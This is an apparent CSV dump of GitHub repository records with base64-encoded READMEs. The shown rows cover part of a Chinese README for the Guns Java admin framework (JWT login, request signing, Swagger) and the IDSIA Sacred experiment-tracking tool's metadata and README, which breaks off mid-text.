sO+8jOS+i+WmgmRlcHRpaWTmiJbogIVpZO+8jOWPpuS4gOS4quWtl+autWRl
cHRJZHPlsLHmmK/lhbfkvZPpnIDopoHov4fmu6TnmoTpg6jpl6hpZOeahOmb
huWQiC7mi6bmiKrlmajljp/nkIblpoLkuIs65oum5oiqbWFwcGVy5Lit5YyF
5ZCrRGF0YVNjb3Bl5a+56LGh55qE5pa55rOV77yM6I635Y+W5YW25Y6f5aeL
c3Fs77yM5bm25YGa5LiA5Liq5YyF6KOF6ZmQ5Yi26YOo6ZeoaWTlnKhkZXB0
SWRz6IyD5Zu05YaF55qE5pWw5o2u6L+b6KGM5bGV56S6LgoKIyMjIHN3YWdn
ZXIgYXBp566h55CG5L2/55So6K+05piOCnN3YWdnZXLkvJrnrqHnkIbmiYDm
nInljIXlkKtAQXBpT3BlcmF0aW9u5rOo6Kej55qE5o6n5Yi25Zmo5pa55rOV
77yM5ZCM5pe277yM5Y+v5Yip55SoQEFwaUltcGxpY2l0UGFyYW1z5rOo6Kej
5qCH6K6w5o6l5Y+j5Lit55qE5Y+C5pWw77yM5YW35L2T55So5rOV6K+35Y+C
6ICDQ29kZUNvbnRyb2xsZXLnsbvkuK3nmoTnlKjms5XjgIIKYGBgCiBAQXBp
T3BlcmF0aW9uKCLkuJrliqHmtYvor5XmjqXlj6MiKQogQEFwaUltcGxpY2l0
UGFyYW1zKHsKICAgICAgICAgQEFwaUltcGxpY2l0UGFyYW0obmFtZSA9ICJt
b2R1bGVOYW1lIiwgdmFsdWUgPSAi5qih5Z2X5ZCN56ewIiwgcmVxdWlyZWQg
PSB0cnVlLCBkYXRhVHlwZSA9ICJTdHJpbmciKSwKICAgICAgICAgQEFwaUlt
cGxpY2l0UGFyYW0obmFtZSA9ICJiaXpDaE5hbWUiLCB2YWx1ZSA9ICLkuJrl
iqHlkI3np7AiLCByZXF1aXJlZCA9IHRydWUsIGRhdGFUeXBlID0gIlN0cmlu
ZyIpLAogICAgICAgICBAQXBpSW1wbGljaXRQYXJhbShuYW1lID0gImJpekVu
TmFtZSIsIHZhbHVlID0gIuS4muWKoeiLseaWh+WQjeensCIsIHJlcXVpcmVk
ID0gdHJ1ZSwgZGF0YVR5cGUgPSAiU3RyaW5nIiksCiAgICAgICAgIEBBcGlJ
bXBsaWNpdFBhcmFtKG5hbWUgPSAicGF0aCIsIHZhbHVlID0gIumhueebrueU
n+aIkOexu+i3r+W+hCIsIHJlcXVpcmVkID0gdHJ1ZSwgZGF0YVR5cGUgPSAi
U3RyaW5nIikKIH0pCiBAUmVxdWVzdE1hcHBpbmcodmFsdWUgPSAiL2dlbmVy
YXRlIiwgbWV0aG9kID0gUmVxdWVzdE1ldGhvZC5QT1NUKQpgYGAKCiMjIyBq
d3QgdG9rZW7pibTmnYPmnLrliLYKand0IHRva2Vu6Ym05p2D5py65Yi25piv
5oyH6Iul6ZyA6KaB6K+35rGC5pyN5Yqh5Zmo5o6l5Y+j77yM5b+F6aG76YCa
6L+HQXV0aENvbnRyb2xsZXLojrflj5bkuIDkuKror7fmsYLku6TniYwoand0
IHRva2VuKe+8jOaMgeaciWp3dCB0b2tlbueahOeUqOaIt+aJjeWPr+S7peiu
v+mXruacjeWKoeWZqOeahOWFtuS7lui1hOa6kO+8jOWmguaenOayoeacieat
pOS7pOeJjO+8jOWImeiuv+mXruaOpeWPo+S8muebtOaOpeW/veeVpe+8jOiv
t+axguiOt+WPlmp3dCB0b2tlbuaXtu+8jOmcgOimgeaQuuW4pmNyZWRlbmNl
TmFtZeWSjGNyZWRlbmNlQ29kZSjlj6/ku6XmmK/otKblj7flr4bnoIHvvIzl
j6/ku6XmmK/miYvmnLrlj7fpqozor4HnoIHnrYnnrYkp77yM5qCh6aqMY3Jl
ZGVuY2VOYW1l5ZKMY3JlZGVuY2VDb2Rl5oiQ5Yqf5ZCO77yM5Lya6aKB5Y+R
57uZ5a6i5oi356uv5LiA5Liqand0IHRva2Vu6L+Y5pyJ5LiA5Liq6ZqP5py6
5a2X56ym5Liy77yM55So5LqO5Lyg6L6T6L+H56iL5Lit5a+55pWw5o2u6L+b
6KGM562+5ZCN55So77yM562+5ZCN5py65Yi26K+36KeB5LiL6Z2i5LuL57uN
LuWfuuS6jnRva2Vu55qE6Ym05p2D5py65Yi257G75Ly85LqOaHR0cOWNj+iu
ruS5n+aYr+aXoOeKtuaAgeeahO+8jOWug+S4jemcgOimgeWcqOacjeWKoeer
r+WOu+S/neeVmeeUqOaIt+eahOiupOivgeS/oeaBr+aIluiAheS8muivneS/
oeaBry7ov5nlsLHmhI/lkbPnnYDln7rkuo50b2tlbuiupOivgeacuuWItuea
hOW6lOeUqOS4jemcgOimgeWOu+iAg+iZkeeUqOaIt+WcqOWTquS4gOWPsOac
jeWKoeWZqOeZu+W9leS6hu+8jOi/meWwseS4uuW6lOeUqOeahOaJqeWxleaP
kOS+m+S6huS+v+WIqS4KCiMjIyDnrb7lkI3mnLrliLYK562+5ZCN5py65Yi2
5piv5oyH5a6i5oi356uv5ZCR5pyN5Yqh56uv5Lyg6L6T5pWw5o2u5Lit77yM
5a+55Lyg6L6T5pWw5o2u6L+b6KGMbWQ15Yqg5a+G77yM5bm25LiU5Yqg5a+G
6L+H56iL5Lit5Yip55SoQXV0aOaOpeWPo+i/lOWbnueahOmaj+acuuWtl+es
puS4sui/m+ihjOa3t+a3huWKoOWvhu+8jOW5tuaKim1kNeWAvOWQjOaXtumZ
hOW4pue7meacjeWKoeerr++8jOacjeWKoeerr+mAmuiOt+WPluaVsOaNruS5
i+WQjuWvueaVsOaNruWGjei/m+ihjOS4gOasoW1kNeWKoOWvhu+8jOiLpeWK
oOWvhue7k+aenOWSjOWuouaIt+err+S8oOadpeeahOaVsOaNruS4gOiHtO+8
jOWImeiupOWumuWuouaIt+err+ivt+axgueahOaVsOaNruaYr+ayoeacieii
q+evoeaUueeahO+8jOiLpeS4jeS4gOiHtO+8jOWImeiupOS4uuiiq+WKoOWv
hueahOaVsOaNruaYr+iiq+evoeaUueeahAoKIyMjIEd1bnPnu4/lhbjniYjm
lYjmnpzlm74KPHRhYmxlPgogICAgPHRyPgogICAgICAgIDx0ZD48aW1nIHNy
Yz0iaHR0cHM6Ly9naXQub3NjaGluYS5uZXQvdXBsb2Fkcy9pbWFnZXMvMjAx
Ny8wNjA0LzE5NDYxNl8zNmVkN2ZkNl81NTEyMDMucG5nIi8+PC90ZD4KICAg
ICAgICA8dGQ+PGltZyBzcmM9Imh0dHBzOi8vZ2l0Lm9zY2hpbmEubmV0L3Vw
bG9hZHMvaW1hZ2VzLzIwMTcvMDYwNC8xOTQ2MjNfYTA3NjFiYzNfNTUxMjAz
LnBuZyIvPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48
aW1nIHNyYz0iaHR0cHM6Ly9naXQub3NjaGluYS5uZXQvdXBsb2Fkcy9pbWFn
ZXMvMjAxNy8wNjA0LzE5NDYzMF82NDBkZmQzNV81NTEyMDMucG5nIi8+PC90
ZD4KICAgICAgICA8dGQ+PGltZyBzcmM9Imh0dHBzOi8vZ2l0Lm9zY2hpbmEu
bmV0L3VwbG9hZHMvaW1hZ2VzLzIwMTcvMDUyNi8xMDQwMTVfYmRiMTRjNzRf
NTUxMjAzLnBuZyIvPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAg
IDx0ZD48aW1nIHNyYz0iaHR0cHM6Ly9naXQub3NjaGluYS5uZXQvdXBsb2Fk
cy9pbWFnZXMvMjAxNy8wNTE2LzAwMDczNV9iODNjNWM0Nl81NTEyMDMucG5n
Ii8+PC90ZD4KICAgICAgICA8dGQ+PGltZyBzcmM9Imh0dHBzOi8vZ2l0Lm9z
Y2hpbmEubmV0L3VwbG9hZHMvaW1hZ2VzLzIwMTcvMDUyNi8xMDM3MzRfYmQz
ZThmNmJfNTUxMjAzLnBuZyIvPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgog
ICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cHM6Ly9naXQub3NjaGluYS5uZXQv
dXBsb2Fkcy9pbWFnZXMvMjAxNy8wNjA0LzE5NDUzOV9mOWJiNDgyYV81NTEy
MDMucG5nIi8+PC90ZD4KICAgICAgICA8dGQ+PGltZyBzcmM9Imh0dHBzOi8v
Z2l0Lm9zY2hpbmEubmV0L3VwbG9hZHMvaW1hZ2VzLzIwMTcvMDUyNi8xMDM3
NDZfNmI0MTI5ZWRfNTUxMjAzLnBuZyIvPjwvdGQ+CiAgICA8L3RyPgogICAg
PHRyPgogICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cHM6Ly9naXQub3NjaGlu
YS5uZXQvdXBsb2Fkcy9pbWFnZXMvMjAxNy8wNTI2LzEwMzc1NV83NzI5Yjkx
Nl81NTEyMDMucG5nIi8+PC90ZD4KICAgICAgICA8dGQ+PGltZyBzcmM9Imh0
dHBzOi8vZ2l0Lm9zY2hpbmEubmV0L3VwbG9hZHMvaW1hZ2VzLzIwMTcvMDUy
Ni8xMDM4MDFfYjgyMTY4NjVfNTUxMjAzLnBuZyIvPjwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cHM6Ly9naXQu
b3NjaGluYS5uZXQvdXBsb2Fkcy9pbWFnZXMvMjAxNy8wNTI2LzEwMzgwN18y
MGJmYjg2OF81NTEyMDMucG5nIi8+PC90ZD4KICAgICAgICA8dGQ+PGltZyBz
cmM9Imh0dHBzOi8vZ2l0Lm9zY2hpbmEubmV0L3VwbG9hZHMvaW1hZ2VzLzIw
MTcvMDUyNi8xMDM4MTRfNjdlMDc4YmJfNTUxMjAzLnBuZyIvPjwvdGQ+CiAg
ICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48aW1nIHNyYz0iaHR0cHM6
Ly9naXQub3NjaGluYS5uZXQvdXBsb2Fkcy9pbWFnZXMvMjAxNy8wNTI2LzEw
MzgyMl81OGZkNWQ5MV81NTEyMDMucG5nIi8+PC90ZD4KICAgICAgICA8dGQ+
PGltZyBzcmM9Imh0dHBzOi8vZ2l0Lm9zY2hpbmEubmV0L3VwbG9hZHMvaW1h
Z2VzLzIwMTcvMDUyNi8xMDM4MjdfZDYyMThjNzRfNTUxMjAzLnBuZyIvPjwv
dGQ+CiAgICA8L3RyPgo8L3RhYmxlPgoKIyMjIHN0eWxlZmVuZ+W8gOa6kOaK
gOacrwoK5a6Y572R77yaaHR0cHM6Ly93d3cuc3R5bGVmZW5nLmNuLw==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'sacred',18302786,"b'Sacred is a tool to help you configure, organize, log and reproduce experiments developed at IDSIA.'",b'Python',97,2398,,2398,False,b'https://api.github.com/repos/IDSIA/sacred/forks',"U2FjcmVkCj09PT09PQoKICAgIHwgKkV2ZXJ5IGV4cGVyaW1lbnQgaXMgc2Fj
cmVkKgogICAgfCAqRXZlcnkgZXhwZXJpbWVudCBpcyBncmVhdCoKICAgIHwg
KklmIGFuIGV4cGVyaW1lbnQgaXMgd2FzdGVkKgogICAgfCAqR29kIGdldHMg
cXVpdGUgaXJhdGUqCgp8cHlwaXwgfHB5X3ZlcnNpb25zfCB8bGljZW5zZXwg
fHJ0ZmR8IHxkb2l8Cgp8YnVpbGR8IHxjb3ZlcmFnZXwgfGNvZGVfcXVhbGl0
eXwgfGJsYWNrfAoKCgoKU2FjcmVkIGlzIGEgdG9vbCB0byBoZWxwIHlvdSBj
b25maWd1cmUsIG9yZ2FuaXplLCBsb2cgYW5kIHJlcHJvZHVjZSBleHBlcmlt
ZW50cy4KSXQgaXMgZGVzaWduZWQgdG8gZG8gYWxsIHRoZSB0ZWRpb3VzIG92
ZXJoZWFkIHdvcmsgdGhhdCB5b3UgbmVlZCB0byBkbyBhcm91bmQKeW91ciBh
Y3R1YWwgZXhwZXJpbWVudCBpbiBvcmRlciB0bzoKCi0ga2VlcCB0cmFjayBv
ZiBhbGwgdGhlIHBhcmFtZXRlcnMgb2YgeW91ciBleHBlcmltZW50Ci0gZWFz
aWx5IHJ1biB5b3VyIGV4cGVyaW1lbnQgZm9yIGRpZmZlcmVudCBzZXR0aW5n
cwotIHNhdmUgY29uZmlndXJhdGlvbnMgZm9yIGluZGl2aWR1YWwgcnVucyBp
biBhIGRhdGFiYXNlCi0gcmVwcm9kdWNlIHlvdXIgcmVzdWx0cwoKU2FjcmVk
IGFjaGlldmVzIHRoaXMgdGhyb3VnaCB0aGUgZm9sbG93aW5nIG1haW4gbWVj
aGFuaXNtczoKCi0gICoqQ29uZmlnU2NvcGVzKiogQSB2ZXJ5IGNvbnZlbmll
bnQgd2F5IG9mIHRoZSBsb2NhbCB2YXJpYWJsZXMgaW4gYSBmdW5jdGlvbgog
ICB0byBkZWZpbmUgdGhlIHBhcmFtZXRlcnMgeW91ciBleHBlcmltZW50IHVz
ZXMuCi0gICoqQ29uZmlnIEluamVjdGlvbioqOiBZb3UgY2FuIGFjY2VzcyBh
bGwgcGFyYW1ldGVycyBvZiB5b3VyIGNvbmZpZ3VyYXRpb24KICAgZnJvbSBl
dmVyeSBmdW5jdGlvbi4gVGhleSBhcmUgYXV0b21hdGljYWxseSBpbmplY3Rl
ZCBieSBuYW1lLgotICAqKkNvbW1hbmQtbGluZSBpbnRlcmZhY2UqKjogWW91
IGdldCBhIHBvd2VyZnVsIGNvbW1hbmQtbGluZSBpbnRlcmZhY2UgZm9yIGVh
Y2gKICAgZXhwZXJpbWVudCB0aGF0IHlvdSBjYW4gdXNlIHRvIGNoYW5nZSBw
YXJhbWV0ZXJzIGFuZCBydW4gZGlmZmVyZW50IHZhcmlhbnRzLgotICAqKk9i
c2VydmVycyoqOiBTYWNyZWQgcHJvdmlkZXMgT2JzZXJ2ZXJzIHRoYXQgbG9n
IGFsbCBraW5kcyBvZiBpbmZvcm1hdGlvbgogICBhYm91dCB5b3VyIGV4cGVy
aW1lbnQsIGl0cyBkZXBlbmRlbmNpZXMsIHRoZSBjb25maWd1cmF0aW9uIHlv
dSB1c2VkLAogICB0aGUgbWFjaGluZSBpdCBpcyBydW4gb24sIGFuZCBvZiBj
b3Vyc2UgdGhlIHJlc3VsdC4gVGhlc2UgY2FuIGJlIHNhdmVkCiAgIHRvIGEg
TW9uZ29EQiwgZm9yIGVhc3kgYWNjZXNzIGxhdGVyLgotICAqKkF1dG9tYXRp
YyBzZWVkaW5nKiogaGVscHMgY29udHJvbGxpbmcgdGhlIHJhbmRvbW5lc3Mg
aW4geW91ciBleHBlcmltZW50cywKICAgc3VjaCB0aGF0IHRoZSByZXN1bHRz
IHJlbWFpbiByZXByb2R1Y2libGUuCgpFeGFtcGxlCi0tLS0tLS0KKy0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSst
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSsK
fCAqKlNjcmlwdCB0byB0cmFpbiBhbiBTVk0gb24gdGhlIGlyaXMgZGF0YXNl
dCoqIHwgKipUaGUgc2FtZSBzY3JpcHQgYXMgYSBTYWNyZWQgZXhwZXJpbWVu
dCoqIHwKKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLSsKfCAuLiBjb2RlOjogcHl0aG9uICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIHwgLi4gY29kZTo6IHB5dGhvbiAgICAgICAgICAg
ICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgIHwKfCAgZnJvbSBudW1weS5yYW5kb20g
aW1wb3J0IHBlcm11dGF0aW9uICAgICAgICAgIHwgICBmcm9tIG51bXB5LnJh
bmRvbSBpbXBvcnQgcGVybXV0YXRpb24gICAgIHwKfCAgZnJvbSBza2xlYXJu
IGltcG9ydCBzdm0sIGRhdGFzZXRzICAgICAgICAgICAgIHwgICBmcm9tIHNr
bGVhcm4gaW1wb3J0IHN2bSwgZGF0YXNldHMgICAgICAgIHwKfCAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICBm
cm9tIHNhY3JlZCBpbXBvcnQgRXhwZXJpbWVudCAgICAgICAgICAgIHwKfCAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
IHwgICBleCA9IEV4cGVyaW1lbnQoJ2lyaXNfcmJmX3N2bScpICAgICAgICAg
IHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIHwgICBAZXguY29uZmlnICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIHwKfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIHwgICBkZWYgY2ZnKCk6ICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIHwKfCAgQyA9IDEuMCAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgIEMgPSAxLjAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgZ2FtbWEgPSAwLjcgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgIGdhbW1hID0g
MC43ICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwKfCAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwg
ICBAZXguYXV0b21haW4gICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwK
fCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIHwgICBkZWYgcnVuKEMsIGdhbW1hKTogICAgICAgICAgICAgICAgICAg
ICAgIHwKfCAgaXJpcyA9IGRhdGFzZXRzLmxvYWRfaXJpcygpICAgICAgICAg
ICAgICAgICAgIHwgICAgIGlyaXMgPSBkYXRhc2V0cy5sb2FkX2lyaXMoKSAg
ICAgICAgICAgIHwKfCAgcGVybSA9IHBlcm11dGF0aW9uKGlyaXMudGFyZ2V0
LnNpemUpICAgICAgICAgIHwgICAgIHBlciA9IHBlcm11dGF0aW9uKGlyaXMu
dGFyZ2V0LnNpemUpICAgIHwKfCAgaXJpcy5kYXRhID0gaXJpcy5kYXRhW3Bl
cm1dICAgICAgICAgICAgICAgICAgIHwgICAgIGlyaXMuZGF0YSA9IGlyaXMu
ZGF0YVtwZXJdICAgICAgICAgICAgIHwKfCAgaXJpcy50YXJnZXQgPSBpcmlz
LnRhcmdldFtwZXJtXSAgICAgICAgICAgICAgIHwgICAgIGlyaXMudGFyZ2V0
ID0gaXJpcy50YXJnZXRbcGVyXSAgICAgICAgIHwKfCAgY2xmID0gc3ZtLlNW
QyhDLCAncmJmJywgZ2FtbWE9Z2FtbWEpICAgICAgICAgIHwgICAgIGNsZiA9
IHN2bS5TVkMoQywgJ3JiZicsIGdhbW1hPWdhbW1hKSAgIHwKfCAgY2xmLmZp
dChpcmlzLmRhdGFbOjkwXSwgICAgICAgICAgICAgICAgICAgICAgIHwgICAg
IGNsZi5maXQoaXJpcy5kYXRhWzo5MF0sICAgICAgICAgICAgICAgIHwKfCAg
ICAgICAgICBpcmlzLnRhcmdldFs6OTBdKSAgICAgICAgICAgICAgICAgICAg
IHwgICAgICAgICAgICAgaXJpcy50YXJnZXRbOjkwXSkgICAgICAgICAgICAg
IHwKfCAgcHJpbnQoY2xmLnNjb3JlKGlyaXMuZGF0YVs5MDpdLCAgICAgICAg
ICAgICAgIHwgICAgIHJldHVybiBjbGYuc2NvcmUoaXJpcy5kYXRhWzkwOl0s
ICAgICAgIHwKfCAgICAgICAgICAgICAgICAgIGlyaXMudGFyZ2V0WzkwOl0p
KSAgICAgICAgICAgIHwgICAgICAgICAgICAgICAgICAgICAgaXJpcy50YXJn
ZXRbOTA6XSkgICAgIHwKKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLSstLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLSsKCkRvY3VtZW50YXRpb24KLS0tLS0tLS0t
LS0tLQpUaGUgZG9jdW1lbnRhdGlvbiBpcyBob3N0ZWQgYXQgYFJlYWRUaGVE
b2NzIDxodHRwOi8vc2FjcmVkLnJlYWR0aGVkb2NzLm9yZy8+YF8uCgpJbnN0
YWxsaW5nCi0tLS0tLS0tLS0KWW91IGNhbiBkaXJlY3RseSBpbnN0YWxsIGl0
IGZyb20gdGhlIFB5dGhvbiBQYWNrYWdlIEluZGV4IHdpdGggcGlwOgoKICAg
IHBpcCBpbnN0YWxsIHNhY3JlZAoKT3IgaWYgeW91IHdhbnQgdG8gZG8gaXQg
bWFudWFsbHkgeW91IGNhbiBjaGVja291dCB0aGUgY3VycmVudCB2ZXJzaW9u
IGZyb20gZ2l0CmFuZCBpbnN0YWxsIGl0IHlvdXJzZWxmOgoKICAgfCBnaXQg
Y2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL0lEU0lBL3NhY3JlZC5naXQKICAg
fCBjZCBzYWNyZWQKICAgfCBweXRob24gc2V0dXAucHkgaW5zdGFsbAoKWW91
IG1pZ2h0IHdhbnQgdG8gYWxzbyBpbnN0YWxsIHRoZSBgYG51bXB5YGAgYW5k
IHRoZSBgYHB5bW9uZ29gYCBwYWNrYWdlcy4gVGhleSBhcmUKb3B0aW9uYWwg
ZGVwZW5kZW5jaWVzIGJ1dCB0aGV5IG9mZmVyIHNvbWUgY29vbCBmZWF0dXJl
czoKCiAgICBwaXAgaW5zdGFsbCBudW1weSwgcHltb25nbwoKVGVzdHMKLS0t
LS0KVGhlIHRlc3RzIGZvciBzYWNyZWQgdXNlIHRoZSBgcHl0ZXN0IDxodHRw
Oi8vcHl0ZXN0Lm9yZy9sYXRlc3QvPmBfIHBhY2thZ2UuCllvdSBjYW4gZXhl
Y3V0ZSB0aGVtIGJ5IHJ1bm5pbmcgYGBweXRlc3RgYCBpbiB0aGUgc2FjcmVk
IGRpcmVjdG9yeSBsaWtlIHRoaXM6CgogICAgcHl0ZXN0CgpUaGVyZSBpcyBh
bHNvIGEgY29uZmlnIGZpbGUgZm9yIGB0b3ggPGh0dHBzOi8vdG94LnJlYWR0
aGVkb2NzLmlvL2VuL2xhdGVzdC8+YF8gc28geW91CmNhbiBhdXRvbWF0aWNh
bGx5IHJ1biB0aGUgdGVzdHMgZm9yIHZhcmlvdXMgcHl0aG9uIHZlcnNpb25z
IGxpa2UgdGhpczoKCiAgICB0b3gKCkNvbnRyaWJ1dGluZwotLS0tLS0tLS0t
LS0KSWYgeW91IGZpbmQgYSBidWcsIGhhdmUgYSBmZWF0dXJlIHJlcXVlc3Qg
b3Igd2FudCB0byBkaXNjdXNzIHNvbWV0aGluZyBnZW5lcmFsIHlvdSBhcmUg
d2VsY29tZSB0byBvcGVuIGFuCmBpc3N1ZSA8aHR0cHM6Ly9naXRodWIuY29t
L0lEU0lBL3NhY3JlZC9pc3N1ZXM+YF8uIElmIHlvdSBoYXZlIGEgc3BlY2lm
aWMgcXVlc3Rpb24gcmVsYXRlZAp0byB0aGUgdXNhZ2Ugb2Ygc2FjcmVkLCBw
bGVhc2UgYXNrIGEgcXVlc3Rpb24gb24gU3RhY2tPdmVyZmxvdyB1bmRlciB0
aGUKYHB5dGhvbi1zYWNyZWQgdGFnIDxodHRwczovL3N0YWNrb3ZlcmZsb3cu
Y29tL3F1ZXN0aW9ucy90YWdnZWQvcHl0aG9uLXNhY3JlZD5gXy4gV2UgdmFs
dWUgZG9jdW1lbnRhdGlvbgphIGxvdC4gSWYgeW91IGZpbmQgc29tZXRoaW5n
IHRoYXQgc2hvdWxkIGJlIGluY2x1ZGVkIGluIHRoZSBkb2N1bWVudGF0aW9u
IHBsZWFzZQpkb2N1bWVudCBpdCBvciBsZXQgdXMga25vdyB3aGF0cyBtaXNz
aW5nLiBJZiB5b3UgYXJlIHVzaW5nIFNhY3JlZCBpbiBvbmUgb2YgeW91ciBw
cm9qZWN0cyBhbmQgd2FudCB0byBzaGFyZQp5b3VyIGNvZGUgd2l0aCBvdGhl
cnMsIHB1dCB5b3VyIHJlcG8gaW4gdGhlIGBQcm9qZWN0cyB1c2luZyBTYWNy
ZWQgPGRvY3MvcHJvamVjdHNfdXNpbmdfc2FjcmVkLnJzdGA+XyBsaXN0LgpQ
dWxsIHJlcXVlc3RzIGFyZSBoaWdobHkgd2VsY29tZSEKCkZyb250ZW5kcwot
LS0tLS0tLS0KQXQgdGhpcyBwb2ludCB0aGVyZSBhcmUgdGhyZWUgZnJvbnRl
bmRzIHRvIHRoZSBkYXRhYmFzZSBlbnRyaWVzIGNyZWF0ZWQgYnkgc2FjcmVk
ICh0aGF0IEknbSBhd2FyZSBvZikuClRoZXkgYXJlIGRldmVsb3BlZCBleHRl
cm5hbGx5IGFzIHNlcGFyYXRlIHByb2plY3RzLgoKYE9tbmlib2FyZCA8aHR0
cHM6Ly9naXRodWIuY29tL3ZpdmVrcmF0bmF2ZWwvb21uaWJvYXJkPmBfCisr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKwouLiBpbWFnZTo6IGRvY3MvaW1hZ2VzL29tbmlib2FyZC10
YWJsZS5wbmcKLi4gaW1hZ2U6OiBkb2NzL2ltYWdlcy9vbW5pYm9hcmQtbWV0
cmljLWdyYXBocy5wbmcKCk9tbmlib2FyZCBpcyBhIHdlYiBkYXNoYm9hcmQg
dGhhdCBoZWxwcyBpbiB2aXN1YWxpemluZyB0aGUgZXhwZXJpbWVudHMgYW5k
IG1ldHJpY3MgLyBsb2dzIGNvbGxlY3RlZCBieSBzYWNyZWQuCk9tbmlib2Fy
ZCBpcyB3cml0dGVuIHdpdGggUmVhY3QsIE5vZGUuanMsIEV4cHJlc3MgYW5k
IEJvb3RzdHJhcC4KCgpgSW5jZW5zZSA8aHR0cHM6Ly9naXRodWIuY29tL0ph
cm5vUkZCL2luY2Vuc2U+YF8KKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrCi4uIGltYWdlOjogZG9j
cy9pbWFnZXMvaW5jZW5zZS1hcnRpZmFjdC5wbmcKLi4gaW1hZ2U6OiBkb2Nz
L2ltYWdlcy9pbmNlbnNlLW1ldHJpYy5wbmcKCkluY2Vuc2UgaXMgYSBQeXRo
b24gbGlicmFyeSB0byByZXRyaWV2ZSBydW5zIHN0b3JlZCBpbiBhIE1vbmdv
REIgYW5kIGludGVyYWN0aXZlbHkgZGlzcGxheSBtZXRyaWNzIGFuZCBhcnRp
ZmFjdHMKaW4gSnVweXRlciBub3RlYm9va3MuCgpgU2FjcmVkYm9hcmQgPGh0
dHBzOi8vZ2l0aHViLmNvbS9jaG92YW5lY20vc2FjcmVkYm9hcmQ+YF8KKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrCi4uIGltYWdlOjogZG9jcy9pbWFnZXMvc2FjcmVkYm9hcmQu
cG5nCgpTYWNyZWRib2FyZCBpcyBhIHdlYi1iYXNlZCBkYXNoYm9hcmQgaW50
ZXJmYWNlIHRvIHRoZSBzYWNyZWQgcnVucyBzdG9yZWQgaW4gYQpNb25nb0RC
LgoKYE5lcHR1bmUgPGh0dHBzOi8vbmVwdHVuZS5tbC8+YF8KKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrCi4uIGltYWdlOjogZG9jcy9pbWFnZXMvbmVwdHVuZS1jb21wYXJlLnBu
ZwouLiBpbWFnZTo6IGRvY3MvaW1hZ2VzL25lcHR1bmUtY29sbGFib3JhdGlv
bi5wbmcKCk5lcHR1bmUgaXMgYSB3ZWIgc2VydmljZSB0aGF0IGxldHMgeW91
IHZpc3VhbGl6ZSwgb3JnYW5pemUgYW5kIGNvbXBhcmUgeW91ciBleHBlcmlt
ZW50IHJ1bnMuCk9uY2UgdGhpbmdzIGFyZSBsb2dnZWQgdG8gTmVwdHVuZSB5
b3UgY2FuIHNoYXJlIGl0IHdpdGggb3RoZXJzLCBhZGQgY29tbWVudHMgYW5k
IGV2ZW4gYWNjZXNzIG9iamVjdHMgdmlhCmV4cGVyaW1lbnQgQVBJOgoKLi4g
aW1hZ2U6OiBkb2NzL2ltYWdlcy9uZXB0dW5lLXF1ZXJ5LWFwaS5wbmcKCklu
